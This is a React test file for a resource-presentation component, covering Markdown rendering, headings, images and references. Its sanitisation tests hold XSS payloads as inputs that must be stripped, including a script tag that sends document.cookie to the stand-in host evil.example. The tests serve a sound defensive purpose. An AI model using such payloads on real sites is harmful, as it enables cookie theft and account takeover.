import { describe, expect, it } from 'vitest';
import type { ReactElement } from 'react';
import { fireEvent, render, screen, waitFor } from '@testing-library/react';
import { uuidSchema } from '@project/core';
import type { AssetRef } from '@project/resource-api/domain';
import { PresentedPluginResource, PresentedResource } from '../src/index';
import { textAsset, WithTexts } from './markdown-texts';

const OWN_ID = '00000000-0000-4000-8000-0000000000a1';
const TARGET_ID = uuidSchema.parse('00000000-0000-4000-8000-0000000000a2');

/** A plugin kind's content, as the Stage reaches it: its own, or a Reference's Target's. */
type PresentedContent =
  | {
      readonly kind: 'markdown';
      readonly content: { readonly url: AssetRef };
      readonly via: 'self' | 'target';
    }
  | {
      readonly kind: 'image';
      readonly content: { readonly url: string };
      readonly via: 'self' | 'target';
    };

/**
 * A Resource a plugin draws, presented as the Stage presents it (ADR 0142):
 * drawn by its own plugin, or, reached `via: 'target'`, a Reference Resource
 * of that Title embedding the Target through the host's embedding.
 */
function Presented({ title, content }: { title: string; content: PresentedContent }) {
  if (content.via === 'self')
    return (
      <PresentedPluginResource
        resourceId={OWN_ID}
        kind={content.kind}
        title={title}
        content={content.content}
      />
    );
  const target =
    content.kind === 'markdown'
      ? { id: TARGET_ID, title: 'Target', kind: 'markdown' as const, content: content.content }
      : { id: TARGET_ID, title: 'Target', kind: 'image' as const, content: content.content };
  return (
    <PresentedPluginResource
      resourceId={OWN_ID}
      kind="reference"
      title={title}
      content={{ target: TARGET_ID }}
      embeddable={[target]}
    />
  );
}

/**
 * Draw a presented Markdown Resource and wait for its text, which the
 * Markdown plugin reads from the asset its content names (ADR 0142).
 */
const presentMarkdown = async (ui: ReactElement) => {
  const rendered = render(ui, { wrapper: WithTexts });
  await waitFor(() => expect(rendered.container.querySelector('.resource__body')).not.toBeNull());
  return rendered;
};

describe('PresentedResource', () => {
  it('renders the Markdown, parsed', async () => {
    const { container } = await presentMarkdown(
      <Presented
        title="Hello"
        content={{
          kind: 'markdown',
          content: { url: textAsset('A paragraph with **bold** text.\n\n- one\n- two') },
          via: 'self',
        }}
      />,
    );

    expect(screen.getByRole('heading', { name: 'Hello' })).toBeInTheDocument();
    // The counterpart to the Resource's source editor: here the markers are
    // consumed and real elements come out.
    expect(container.querySelector('strong')?.textContent).toBe('bold');
    expect(container.querySelectorAll('li')).toHaveLength(2);
  });

  /**
   * The Stage scrolls a presented Resource only when `.resource__body hr`
   * matches (`stage.css`), so a rule in the Markdown, its own or a Target's,
   * has to come out as an `hr` inside that wrapper. A setext underline is a
   * heading, not a rule, and must not.
   */
  it.each(['self', 'target'] as const)(
    'draws a rule in Markdown reached via %s as an hr inside the body the Stage reads',
    async (via) => {
      const { container } = await presentMarkdown(
        <Presented
          title="Long"
          content={{ kind: 'markdown', content: { url: textAsset('Shown.\n\n---\n\nMore.') }, via }}
        />,
      );

      expect(container.querySelector('.resource__body hr')).not.toBeNull();
    },
  );

  it('leaves out a first heading that repeats the name drawn above it', async () => {
    const { container } = await presentMarkdown(
      <Presented
        title={'The  Problem\nWhy it matters'}
        content={{
          kind: 'markdown',
          content: { url: textAsset('\n# the problem\n\nBody.\n\n## The problem') },
          via: 'self',
        }}
      />,
    );

    expect(screen.getAllByRole('heading', { level: 2 })).toHaveLength(2);
    expect(container.querySelector('.resource__body h1')).toBeNull();
    expect(container.querySelector('.resource__body p')?.textContent).toBe('Body.');
  });

  it('keeps a first heading that says something other than the name', async () => {
    const { container } = await presentMarkdown(
      <Presented
        title="The problem"
        content={{
          kind: 'markdown',
          content: { url: textAsset('# A different heading\n\nBody.') },
          via: 'self',
        }}
      />,
    );

    expect(container.querySelector('.resource__body h1')?.textContent).toBe('A different heading');
  });

  it('draws a setext underline as a heading, with no hr for the Stage to read', async () => {
    const { container } = await presentMarkdown(
      <Presented
        title="Short"
        content={{
          kind: 'markdown',
          content: { url: textAsset('Heading\n---\n\nBody.') },
          via: 'self',
        }}
      />,
    );

    expect(container.querySelector('.resource__body hr')).toBeNull();
  });

  it('presents an Image Resource as its picture alone, the name as the text alternative', () => {
    render(
      <Presented
        title={'Harbour\nAt dusk'}
        content={{
          kind: 'image',
          content: { url: 'https://example.com/h.png' },
          via: 'self',
        }}
      />,
    );

    expect(screen.queryByRole('heading')).toBeNull();
    expect(screen.getByRole('img', { name: 'Harbour' })).toHaveAttribute(
      'src',
      'https://example.com/h.png',
    );
  });

  /**
   * The Title ladder is the drawn Resource's and nothing else's (ADR 0083). A
   * presented Resource is a different surface with a different frame around it, so
   * it draws the Resource's **name** — and a heading is a single line of text
   * whatever the string handed to it contains, so a Title reaching one whole
   * would draw its lines run together with a space between them.
   */
  it('heads a presented Resource with the Resource’s name', async () => {
    await presentMarkdown(
      <Presented
        title={'Auth\nHow a session begins'}
        content={{ kind: 'markdown', content: { url: textAsset('Body.') }, via: 'self' }}
      />,
    );

    expect(screen.getByRole('heading', { name: 'Auth' })).toBeInTheDocument();
    expect(screen.queryByText(/How a session begins/u)).toBeNull();
  });

  it('presents a Reference Resource to an Image Resource as its Target’s image, with no Replace', () => {
    render(
      <Presented
        title="Harbour, again"
        content={{
          kind: 'image',
          content: { url: 'https://example.com/h.png' },
          via: 'target',
        }}
      />,
    );

    const picture = screen.getByRole('img', { name: 'Harbour, again' });
    // The Reference passes its own Title, which the picture is named by, and
    // draws none of its own (ADR 0070, ADR 0142).
    expect(screen.queryByRole('heading')).toBeNull();
    expect(picture).toHaveAttribute('src', 'https://example.com/h.png');
    fireEvent.error(picture);
    expect(screen.getByTestId('image-failed')).toBeInTheDocument();
    expect(screen.queryByRole('button', { name: /Replace image/ })).toBeNull();
  });

  /**
   * A Space Resource's Map needs the Space it points at, which only the
   * application can hold, so the application hands the drawing in and it
   * takes the place of the content's own view (ADR 0123).
   */
  it('draws what the application hands it in place of the content’s own view', () => {
    const { container } = render(
      <PresentedResource
        title="Roadmap"
        content={{
          kind: 'space',
          view: {
            spaceId: uuidSchema.parse('00000000-0000-4000-8000-000000000001'),
            map: uuidSchema.parse('00000000-0000-4000-8000-000000000002'),
            graph: uuidSchema.parse('00000000-0000-4000-8000-000000000003'),
            framing: undefined,
          },
          via: 'self',
        }}
      >
        <div data-testid="drawn-map" />
      </PresentedResource>,
    );

    expect(screen.getByRole('heading', { name: 'Roadmap' })).toBeInTheDocument();
    expect(screen.getByTestId('drawn-map')).toBeInTheDocument();
    expect(container.querySelector('.resource--drawn')).not.toBeNull();
  });

  it('presents a Space Resource as its name alone', () => {
    const { container } = render(
      <PresentedResource
        title="Roadmap"
        content={{
          kind: 'space',
          view: {
            spaceId: uuidSchema.parse('00000000-0000-4000-8000-000000000001'),
            map: uuidSchema.parse('00000000-0000-4000-8000-000000000002'),
            graph: uuidSchema.parse('00000000-0000-4000-8000-000000000003'),
            framing: undefined,
          },
          via: 'self',
        }}
      />,
    );

    expect(screen.getByRole('heading', { name: 'Roadmap' })).toBeInTheDocument();
    expect(container.querySelector('.resource__body')).toBeNull();
    expect(screen.queryByTestId('unresolved-content')).toBeNull();
  });

  /**
   * An Ur Resource has no content (ADR 0113), so presenting it draws its name
   * alone, as a title slide; a Reference Resource to one draws the same.
   */
  it('presents an Ur Resource as a title slide, itself or through a Reference Resource', () => {
    for (const via of ['self', 'target'] as const) {
      const { container, unmount } = render(
        <PresentedResource
          title={'Gateway\nthe one way in'}
          content={{ kind: 'ur', content: {}, via }}
        />,
      );

      const slide = screen.getByTestId('resource-content');
      expect(slide).toHaveAttribute('data-content-kind', 'ur');
      expect(screen.getByRole('heading', { name: 'Gateway' })).toBeInTheDocument();
      expect(slide.textContent).toBe('Gateway');
      expect(container.querySelector('.resource__body')).toBeNull();
      expect(screen.queryByTestId('unresolved-content')).toBeNull();
      unmount();
    }
  });

  it('presents an unresolved Target as a notice, not an empty document', () => {
    const { container } = render(
      <PresentedResource title="Dangling" content={{ kind: 'unresolved', via: 'target' }} />,
    );

    expect(screen.getByRole('heading', { name: 'Dangling' })).toBeInTheDocument();
    expect(screen.getByTestId('unresolved-content')).toHaveTextContent('Target not found');
    expect(container.querySelector('.resource__body')).toBeNull();
  });

  /**
   * The HTML goes in through `dangerouslySetInnerHTML`, so what `marked` emits
   * reaches the DOM. `marked` has no `sanitize` option and passes inline HTML
   * through verbatim, so unsanitised, every one of these would be live.
   *
   * These are asserted on the rendered DOM rather than on a sanitiser call,
   * because the property that matters is "no executable attribute survives into
   * the document", not "a particular function was invoked".
   */
  describe('sanitises the HTML it injects', () => {
    it('strips event-handler attributes', async () => {
      const { container } = await presentMarkdown(
        <Presented
          title="T"
          content={{
            kind: 'markdown',
            content: { url: textAsset('<img src=x onerror="alert(document.domain)">') },
            via: 'self',
          }}
        />,
      );

      const img = container.querySelector('img');
      expect(img).not.toBeNull();
      // The element survives — sanitising is not escaping, and a resource that
      // legitimately embeds an image should still show one.
      expect(img?.getAttribute('onerror')).toBeNull();
      expect(container.innerHTML).not.toContain('onerror');
    });

    it('strips javascript: hrefs while keeping the link', async () => {
      const { container } = await presentMarkdown(
        <Presented
          title="T"
          content={{
            kind: 'markdown',
            content: { url: textAsset('[click](javascript:alert(1))') },
            via: 'self',
          }}
        />,
      );

      // Assert the anchor survives, not just that the scheme is gone: deleting
      // the whole element would satisfy the second check and quietly turn
      // sanitising into censoring.
      const link = container.querySelector('a');
      expect(link).not.toBeNull();
      expect(link?.textContent).toBe('click');
      expect(link?.getAttribute('href')).toBeNull();
      expect(container.innerHTML).not.toContain('javascript:');
    });

    it('drops script and iframe elements entirely', async () => {
      const { container } = await presentMarkdown(
        <Presented
          title="T"
          content={{
            kind: 'markdown',
            content: {
              url: textAsset(
                '<script>fetch("//evil.example/"+document.cookie)</script>\n\n' +
                  '<iframe src="javascript:alert(1)"></iframe>',
              ),
            },
            via: 'self',
          }}
        />,
      );

      expect(container.querySelector('script')).toBeNull();
      expect(container.querySelector('iframe')).toBeNull();
      expect(container.innerHTML).not.toContain('evil.example');
    });

    it('strips inline handlers on anchors', async () => {
      const { container } = await presentMarkdown(
        <Presented
          title="T"
          content={{
            kind: 'markdown',
            content: { url: textAsset('<a href="#" onclick="alert(1)">x</a>') },
            via: 'self',
          }}
        />,
      );

      expect(container.querySelector('a')?.getAttribute('onclick')).toBeNull();
      expect(container.innerHTML).not.toContain('onclick');
    });
  });
});

/**
 * Below a name it draws itself, `PresentedResource` draws a plugin kind's
 * content read-only, as the Notes window draws a presented note and a
 * preview of each move (ADR 0129).
 */
describe('PresentedResource drawing a plugin kind’s content below its name', () => {
  it('draws Markdown content, parsed, under the one name it heads with', async () => {
    const { container } = await presentMarkdown(
      <PresentedResource
        title="Demo"
        content={{
          kind: 'markdown',
          content: { url: textAsset('A live walk through checkout.') },
          via: 'self',
        }}
      />,
    );

    expect(screen.getAllByRole('heading', { name: 'Demo' })).toHaveLength(1);
    expect(container.querySelector('.resource__body')).toHaveTextContent(
      'A live walk through checkout.',
    );
  });

  it('draws Image content as its picture, the name as the text alternative', () => {
    render(
      <PresentedResource
        title={'Harbour\nAt dusk'}
        content={{
          kind: 'image',
          content: { url: 'https://example.com/h.png' },
          via: 'self',
        }}
      />,
    );

    expect(screen.getByRole('heading', { name: 'Harbour' })).toBeInTheDocument();
    expect(screen.getByRole('img', { name: 'Harbour' })).toHaveAttribute(
      'src',
      'https://example.com/h.png',
    );
  });
});
